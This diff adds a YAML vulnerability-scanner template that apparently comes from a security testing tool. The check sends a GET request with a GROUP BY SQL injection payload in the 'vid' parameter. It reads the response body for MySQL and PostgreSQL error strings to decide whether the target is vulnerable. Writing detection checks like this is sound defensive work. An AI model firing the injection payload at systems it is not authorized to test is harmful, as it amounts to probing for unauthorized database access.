@@ -1,0 +1,21 @@
+id: sqli3-having-51
+name: 'HAVING/GROUP injection in vid'
+severity: high
+type: active
+tags:
+  - sqli
+  - injection
+description: 'Triggers DB error via vid'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      vid:
+        - ''' GROUP BY 1,2--'
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SQL syntax'
+          - 'mysql_fetch'
+          - 'PostgreSQL'
